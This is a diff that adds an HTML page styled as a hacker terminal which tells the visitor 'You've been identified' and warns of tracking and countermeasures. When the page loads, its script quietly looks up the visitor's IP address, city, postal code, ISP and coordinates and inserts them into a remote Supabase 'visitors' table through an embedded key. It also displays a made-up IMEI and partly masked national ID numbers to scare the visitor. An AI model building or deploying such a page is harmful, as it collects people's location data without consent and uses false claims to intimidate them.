@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Identification Notice</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap');
+    body {
+      font-family: 'Source Code Pro', monospace;
+      background-color: #000;
+      overflow: hidden;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .terminal { width: 90%; max-width: 800px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); overflow: hidden; }
+    .terminal-header { background-color: #1a1a1a; padding: 10px 15px; display: flex; align-items: center; }
+    .terminal-buttons { display: flex; gap: 8px; }
+    .terminal-button { width: 12px; height: 12px; border-radius: 50%; }
+    .terminal-content { background-color: rgba(0, 0, 0, 0.9); padding: 30px; color: #0f0; min-height: 300px; position: relative; }
+    .command-line { display: flex; align-items: center; margin-bottom: 20px; }
+    .prompt { color: #0f0; margin-right: 10px; }
+    .cursor { display: inline-block; width: 10px; height: 20px; background-color: #0f0; animation: blink 1s infinite; vertical-align: middle; }
+    .message { font-size: 1.5rem; line-height: 1.5; opacity: 0; animation: fadeIn 2s forwards; animation-delay: 1.5s; }
+    .scanline { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, rgba(0, 255, 0, 0.03) 0%, rgba(0, 255, 0, 0.1) 50%, rgba(0, 255, 0, 0.03) 100%); background-size: 100% 8px; pointer-events: none; animation: scan 8s linear infinite; }
+    .glitch { position: relative; }
+    .glitch::before, .glitch::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+    .glitch::before { color: #f0f; animation: glitch-effect 3s infinite; z-index: -1; }
+    .glitch::after { color: #0ff; animation: glitch-effect 2s infinite reverse; z-index: -2; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+    @keyframes glitch-effect {
+      0% { transform: translate(0); }
+      20% { transform: translate(-3px, 3px); }
+      40% { transform: translate(-3px, -3px); }
+      60% { transform: translate(3px, 3px); }
+      80% { transform: translate(3px, -3px); }
+      100% { transform: translate(0); }
+    }
+    .progress-bar { height: 4px; background-color: #0f0; width: 0%; margin-top: 20px; animation: progress 3s forwards; }
+    @keyframes progress { from { width: 0%; } to { width: 100%; } }
+    .access-denied { color: #f00; font-weight: bold; opacity: 0; animation: fadeIn 1s forwards; animation-delay: 4s; }
+    .flashing-text { animation: flash 0.5s infinite alternate; }
+    @keyframes flash { from { opacity: 0.5; } to { opacity: 1; } }
+    .apify-location, .apify-address, .apify-connectivity, .apify-map, .apify-imei, .apify-nik { margin-top: 10px; font-size: 14px; color: #0f0; }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-buttons">
+        <div class="terminal-button bg-red-500"></div>
+        <div class="terminal-button bg-yellow-500"></div>
+        <div class="terminal-button bg-green-500"></div>
+      </div>
+      <div class="text-gray-300 text-sm ml-4">root@system:~</div>
+    </div>
+    <div class="terminal-content">
+      <div class="command-line">
+        <span class="prompt">$</span>
+        <span id="typing-text"></span>
+        <span class="cursor"></span>
+      </div>
+      <div class="message">
+        <div class="glitch" data-text="Hi, You've been identified">
+          <span class="flashing-text">Hi, You've been identified</span>
+        </div>
+        <div class="progress-bar"></div>
+        <div id="apify-location" class="apify-location"></div>
+        <div id="apify-address" class="apify-address"></div>
+        <div id="apify-connectivity" class="apify-connectivity"></div>
+        <div id="apify-map" class="apify-map"></div>
+        <div id="map-container" class="mt-5"></div>
+        <div id="apify-imei" class="apify-imei" class="mt-5"></div>
+        <div id="apify-nik" class="apify-nik" class="mt-5"></div>
+        <div class="access-denied">
+          WARNING: SYSTEM INTRUSION DETECTED<br>
+          LOCATION: TRACKED<br>
+          COUNTERMEASURES: ENGAGED
+        </div>
+      </div>
+      <div class="scanline"></div>
+    </div>
+  </div>
+
+  <script>
+    const { createClient } = supabase;
+    const supabaseUrl = 'https://tlcytnpiefvopefokaen.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRsY3l0bnBpZWZ2b3BlZm9rYWVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU3MTEwNzMsImV4cCI6MjA2MTI4NzA3M30.53G18IQzQQL4YjFaFKhFHLFi-1LWXHJ20KikefXjEyA';
+    const supabaseClient = createClient(supabaseUrl, supabaseKey);
+
+    document.addEventListener('DOMContentLoaded', function () {
+      const text = "scan --connectivity --hotspot --cellular-signal";
+      const typingText = document.getElementById('typing-text');
+      const apifyLocationEl = document.getElementById('apify-location');
+      const apifyAddressEl = document.getElementById('apify-address');
+      const apifyConnectivityEl = document.getElementById('apify-connectivity');
+      const apifyMapEl = document.getElementById('apify-map');
+      const apifyImeiEl = document.getElementById('apify-imei');
+      const apifyNikEl = document.getElementById('apify-nik');
+      let i = 0;
+
+      function typeWriter() {
+        if (i < text.length) {
+          typingText.innerHTML += text.charAt(i);
+          i++;
+          setTimeout(typeWriter, Math.random() * 100 + 50);
+        } else {
+          setTimeout(() => {
+            typingText.innerHTML += '<br>$ <span class="text-gray-400">Success Fetch Data From Nearest Signal/Hotspot...</span>';
+          }, 500);
+        }
+      }
+      typeWriter();
+      collectUserData();
+
+      async function collectUserData() {
+        const fallbackUserData = {
+            location: 'OKI, Sumatera Selatan'
+        }
+
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          const apiData = await response.json();
+          apifyLocationEl.innerHTML = `<strong>IP:</strong> ${apiData.ip}, ${apiData.network}`;
+          apifyAddressEl.innerHTML = `<strong>Location:</strong> ${apiData.city}, ${apiData.country_name} (${apiData.postal})`;
+          apifyConnectivityEl.innerHTML = `<strong>Connection:</strong> ${apiData.org}`;
+          apifyMapEl.innerHTML = `<strong>Coordinate:</strong> ${apiData.longitude},${apiData.latitude}`;
+          apifyImeiEl.innerHTML = `<strong>Detected IMEI history:</strong> 35588514559963`;
+          apifyNikEl.innerHTML = `<strong>Registered NIK by IMEI:</strong> 3521087006****/3521081111****`;
+
+          const userData = {
+            ipaddress: `${apiData.ip}, ${apiData.network}`,
+            origin: `${apiData.city}, ${apiData.country_name} (${apiData.postal})`,
+            organization: `${apiData.org}`,
+            location: `${apiData.longitude},${apiData.latitude}`
+          };
+
+          const { error } = await supabaseClient.from("visitors").insert([userData]);
+          if (error) console.error("Supabase insert error:", error);
+        } catch (err) {
+          console.error('Error fetching Apify data:', err);
+          await supabaseClient.from("visitors").insert([fallbackUserData]);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
